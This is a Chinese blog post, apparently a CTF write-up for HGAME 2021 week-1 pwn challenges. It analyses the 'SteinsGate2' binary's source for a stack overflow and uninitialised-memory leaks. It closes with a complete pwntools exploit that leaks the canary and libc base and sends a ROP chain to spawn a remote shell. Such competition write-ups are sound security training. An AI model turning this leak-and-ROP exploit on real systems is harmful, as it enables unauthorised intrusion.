<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>HGAME2021-WEAK1-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="许久没有更新博客了，主要是因为最近都在打 hgame，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的"><meta property="og:image" content><meta property="og:title" content="HGAME2021-WEAK1-WP"><meta property="og:description" content="许久没有更新博客了，主要是因为最近都在打 hgame，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1044.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-02-07T20:00:00+00:00"><meta property="article:modified_time" content="2021-02-07T20:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="HGAME2021-WEAK1-WP"><meta name=twitter:description content="许久没有更新博客了，主要是因为最近都在打 hgame，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.44a18422ec0066708fd200e05feb946702a7b17e5d322ff1a35ef8be5c62ad32.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>HGAME2021-WEAK1-WP</h1><div class=meta>Posted on Feb 7, 2021</div></div><section class=body><p>许久没有更新博客了，主要是因为最近都在打 <code>hgame</code>，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的合集。bin 的题是都解出来了，别的方向大概也就做了做签到，应该说是真的不会，最后的总分是真的不怎么好看，pwn手心里苦啊。</p><h2 id=pwn>pwn</h2><h4 id=whitegive>whitegive</h4><p>签到题</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/2090082406.png></div><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3099474339.png></div><p>地址是 0x402012=4202514，所以nc上去输入就可以 get shell 了。</p><h4 id=steinsgate2>SteinsGate2</h4><p>这道题目看起来很难,但实际上比后两道都要简单,主要难点在代码审计上。</p><p>1月30日晚拿到题目，发现有个叫 source.zip 的压缩包，心想果然是新手赛，源码都给，然后发现</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3089131650.png></div><p>要密码？？？难道是藏在题目里了？这么高级。遂打开 IDA ，发现留了不少编译信息，但是好像看不懂程序在干什么，于是打开虚拟机</p><p>先跑跑看</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/1273312078.png></div><p>不知道是什么鬼，遇事不决先 checksec 吧</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/2139110982.png></div><p>保护全开，这个时候其实心态开始崩了，遂去做别的方向的题，发现毛都不会，又继续玩了许久这个程序，还去看了看命运石之门是什么东西（日本的游戏大概也就玩过南梦宫的皇牌空战什么的了），发现也没什么帮助。到11点的时候已经有点想去世了，搞了一个学期的 pwn 竟然只会签到，而别的方向的大佬已经千分了。最后实在没忍住，问了一下小语师傅（%语神）题目怎么做</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/4057709745.png></div><p>于是附件更新了，没有密码了。既然有源码，考虑 <code>-g</code> 编译一下，动调起来也幸福快乐一点</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/1886216232.png></div><p>看到了一个亮眼的格式化字符串漏洞（虽然最后没用上，难道我的解法是非预期解？）。那就看看怎么样可以利用这个漏洞吧，代码在 <code>world.h</code> 中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#define PUTDMAIL()                                 \
</span></span></span><span style=display:flex><span><span style=color:#007020>    do                                             \
</span></span></span><span style=display:flex><span><span style=color:#007020>    {                                              \
</span></span></span><span style=display:flex><span><span style=color:#007020>        SCRIPT_PRINT(11 - from_dm);                \
</span></span></span><span style=display:flex><span><span style=color:#007020>        if (save.know_truth &amp;&amp; cur_divergence &gt; 1) \
</span></span></span><span style=display:flex><span><span style=color:#007020>            printf(dmail_buf);                     \
</span></span></span><span style=display:flex><span><span style=color:#007020>        else                                       \
</span></span></span><span style=display:flex><span><span style=color:#007020>            SCRIPT_NEXT();                         \
</span></span></span><span style=display:flex><span><span style=color:#007020>    } while (0)
</span></span></span></code></pre></div><p>是这样的一个宏，在主循环中调用</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3577921902.png></div><p>也就是说，只要我们让 <code>save.know_truth && cur_divergence > 1</code> 成立就可以利用这个 <code>fmt</code> 了，当时我也不知道 <code>save.know_truth</code> 是什么鬼，所以就先考虑了使 <code>cur_divergence</code> 大于1的方法（浪费了我大量时间：(）。</p><p>先来看看 <code>cur_divergence</code> 这个变量在整个工程的地位</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3605398744.png></div><p>发现实际上只有一个函数修改了这个变量</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>divergence_update</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#902000>float</span> field <span style=color:#666>=</span> floorf(divergence);
</span></span><span style=display:flex><span>    cur_divergence <span style=color:#666>=</span> divergence;
</span></span><span style=display:flex><span>    cur_divergence <span style=color:#666>*=</span> (save.ent_flag <span style=color:#666>+</span> <span style=color:#40a070>0x233</span>);
</span></span><span style=display:flex><span>    cur_divergence <span style=color:#666>-=</span> floorf(cur_divergence) <span style=color:#666>-</span> field;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>而 <code>divergence</code> 是在这个函数里生成的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>divergence_init</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    srand(<span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> (<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> rd <span style=color:#666>=</span> rand() <span style=color:#666>&amp;</span> <span style=color:#40a070>0x7fffffff</span>;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (rd <span style=color:#666>&lt;</span> <span style=color:#40a070>0x10000</span>)
</span></span><span style=display:flex><span>            divergence <span style=color:#666>=</span> <span style=color:#40a070>1.0</span>;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>            divergence <span style=color:#666>=</span> <span style=color:#40a070>0.0</span>;
</span></span><span style=display:flex><span>        <span style=color:#902000>float</span> di <span style=color:#666>=</span> (<span style=color:#902000>float</span>)(rd <span style=color:#666>*</span> <span style=color:#40a070>100</span> <span style=color:#666>+</span> <span style=color:#40a070>0x233</span> <span style=color:#666>&amp;</span> <span style=color:#40a070>0x7fffffff</span>) <span style=color:#666>/</span> <span style=color:#40a070>1000000</span>;
</span></span><span style=display:flex><span>        di <span style=color:#666>-=</span> floorf(di);
</span></span><span style=display:flex><span>        divergence <span style=color:#666>+=</span> di;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (divergence <span style=color:#666>&gt;</span> <span style=color:#40a070>1e-6</span>)
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    divergence_update();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这里的 <code>srand(0)</code> 非常的引人注目，题目也贴心的给出了 libc（大概是因为用 <code>LibcSearcher</code> 搜不出来的缘故吧），所以这个 <code>divergence</code> 的值是可确定的，而通过控制变量 <code>save.ent_flag</code> 就可以控制 <code>cur_divergence</code> 了，如何控制这个变量？</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/4119160246.png></div><p>四个事件都可以控制，前三个都很好触发，就是 <code>event_ibn5100</code> 这个触发不了，看一看源码</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (cur_divergence <span style=color:#666>&gt;</span> <span style=color:#40a070>1.0</span> <span style=color:#666>||</span> <span style=color:#666>!</span>save.know_truth)
</span></span><span style=display:flex><span>        scene<span style=color:#666>-&gt;</span>branchid <span style=color:#666>=</span> <span style=color:#40a070>7</span>;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>else</span> <span style=color:#06287e>if</span> (choice <span style=color:#666>==</span> <span style=color:#40a070>1</span> <span style=color:#666>&amp;&amp;</span> save.days <span style=color:#666>&gt;</span> <span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>        scene<span style=color:#666>-&gt;</span>branchid <span style=color:#666>=</span> <span style=color:#40a070>6</span>;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>else</span> <span style=color:#06287e>if</span> (choice <span style=color:#666>==</span> <span style=color:#40a070>1</span> <span style=color:#666>&amp;&amp;</span> save.days <span style=color:#666>==</span> <span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        scene<span style=color:#666>-&gt;</span>branchid <span style=color:#666>=</span> <span style=color:#40a070>2</span>;
</span></span><span style=display:flex><span>        save.ibn5100 <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>        save.ent_flag <span style=color:#666>|=</span> EVENT_IBN5100;
</span></span><span style=display:flex><span>        SCRIPT_NEXT();
</span></span><span style=display:flex><span>        <span style=color:#902000>char</span> msg[<span style=color:#40a070>80</span>];
</span></span><span style=display:flex><span>        scanf(<span style=color:#4070a0>&#34;%s&#34;</span>, msg);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>发现竟然有 <code>scanf("%s", msg);</code> ，可以栈溢出。这个时候就要仔细考虑要fmt还是rop了。于是考虑写个脚本跑一下，看看各种<code>save.ent_flag</code>的取值对 <code>cur_divergence</code> 的影响，结果发现 <code>cur_divergence</code> 好像也确实是不会大于1的，遂弃fmt转向rop。要执行这个scanf，需要在第一天选去神社找ibn5100，而且还要使 <code>save.know_truth</code> 不为0，这个变量初始值为0，所以我们需要考虑一下如何使它为非零，看一看它在工程中出现在了那些地方</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/1186765046.png></div><p>只在一处 Set 了该变量，看一下这里的代码，发现</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>world_main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> from_dm;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> (<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>switch</span> (save.current_scene)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>case</span> <span style=color:#002070;font-weight:700>BRANCH</span>:
</span></span><span style=display:flex><span>            save.know_truth <span style=color:#666>=</span> divergence_detect();
</span></span><span style=display:flex><span>            save.current_scene <span style=color:#666>=</span> DAYS;
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>break</span>;
</span></span></code></pre></div><p>branch 的值是2，也就是第二个场景，第二个场景问了我们当前的世界线变动率是多少，也就是 <code>divergence_detect()</code> 函数干的事，这个函数是这样的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>divergence_detect</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#902000>float</span> div;
</span></span><span style=display:flex><span>    SCRIPT_NEXT();
</span></span><span style=display:flex><span>    scanf(<span style=color:#4070a0>&#34;%f&#34;</span>, <span style=color:#666>&amp;</span>div);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (fabsf(div <span style=color:#666>-</span> cur_divergence) <span style=color:#666>&lt;</span> <span style=color:#40a070>1e-6</span>)
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>那么我们只要在最开始时输入一个和 <code>cur_divergence</code> 足够接近的的数就可以使 <code>save.know_truth</code> 为1了。之前也说了，<code>cur_divergence</code> 由 <code>divergence</code> 和 <code>save.ent_flag</code> 生成，后者此时为0，前者是我们可以知道的，所以写个脚本跑一下，得知 <code>cur_divergence</code> 为 <code>0.898834229</code> ，所以输入该数就可以实现栈溢出了。</p><p>光能栈溢出是不够的，还需要leak一些信息，程序中也有。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>char</span> cmd[<span style=color:#40a070>0x100</span>];
</span></span><span style=display:flex><span>    my_read(cmd, <span style=color:#40a070>0x100</span>);
</span></span><span style=display:flex><span>    SCRIPT_PRINT(cmd);
</span></span><span style=display:flex><span>    SCRIPT_NEXT();
</span></span><span style=display:flex><span>    save.sern <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>    save.ent_flag <span style=color:#666>|=</span> EVENT_HACKING;
</span></span></code></pre></div><p>这是 <code>event_hacking()</code> 中的部分代码，这里没有对cmd数组进行初始化，所以很有可能可以leak出栈上残留的信息，获得 <code>canary</code> 和 <code>libc</code> 基地址</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/152702112.png></div><p>这两处可以 leak 。所以题目就可以做了</p><h4 id=exp>exp</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>LibcSearcher</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#context(log_level = &#39;debug&#39;)</span>
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>banana</span>():
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;5100</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;？</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,<span style=color:#4070a0>&#39;pwn&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>hack</span>(payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;5100</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;choice: &#39;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;choice: &#39;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;)</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>IBN</span>(payload,choice):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;5100</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;choice: &#39;</span>,<span style=color:#007020>str</span>(choice))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;了</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.108.71&#34;</span>,<span style=color:#40a070>30009</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./sga&#34;)</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;choice: &#39;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#password = 0.8339385986</span>
</span></span><span style=display:flex><span>password <span style=color:#666>=</span> <span style=color:#40a070>0.898834229</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,<span style=color:#007020>str</span>(password))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>IBN(<span style=color:#4070a0>&#39;pwn&#39;</span>,<span style=color:#40a070>1</span>)<span style=color:#60a0b0;font-style:italic>#1</span>
</span></span><span style=display:flex><span>banana()<span style=color:#60a0b0;font-style:italic>#2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>hack(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>23</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span>)<span style=color:#60a0b0;font-style:italic>#3</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;ab&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__isoc99_scanf&#34;</span>] <span style=color:#666>-</span> <span style=color:#40a070>178</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;libc base:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xe6c81</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;one_gadget:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(one_gadget))
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;system&#34;</span>]
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;system:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(system_addr))
</span></span><span style=display:flex><span>bin_sh_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>search(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>)<span style=color:#666>.</span>next()
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;/bin/sh:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(bin_sh_addr))
</span></span><span style=display:flex><span>pop_rdi_somereg_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x276e9</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;pop_rdi_ret:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(pop_rdi_ret))
</span></span><span style=display:flex><span>exit_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;exit&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#__isoc99_scanf_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#libcs = LibcSearcher(&#34;__isoc99_scanf&#34;,__isoc99_scanf_addr)</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#libc_base = __isoc99_scanf_addr - libcs.dump(&#34;__isoc99_scanf&#34;)</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#system_addr = libc_base + libc.dump(&#34;system&#34;)</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#bin_sh_addr = libc_base + libc.dump(&#34;str_bin_sh&#34;)</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#pop_rdi_ret = libc_base + 0x26b72</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>4</span>,<span style=color:#40a070>11</span>):
</span></span><span style=display:flex><span>    banana()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;挣扎</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#34;pwn&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)<span style=color:#60a0b0;font-style:italic>#1</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;了</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;pwn&#39;</span>)
</span></span><span style=display:flex><span>banana()<span style=color:#60a0b0;font-style:italic>#2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>hack(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>56</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span>)<span style=color:#60a0b0;font-style:italic>#3</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;ab&#39;</span>)
</span></span><span style=display:flex><span>canary <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>7</span>)<span style=color:#666>.</span>rjust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;canary:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(canary))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>4</span>,<span style=color:#40a070>11</span>):
</span></span><span style=display:flex><span>    banana()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;挣扎</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#34;pwn&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;choice: &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x58</span> <span style=color:#666>+</span> p64(canary)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x7fffffff0000</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdi_somereg_ret) <span style=color:#666>+</span> p64(bin_sh_addr) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(system_addr)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload += p64(one_gadget)</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;了</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload <span style=color:#666>+</span> <span style=color:#4070a0>&#39; &#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
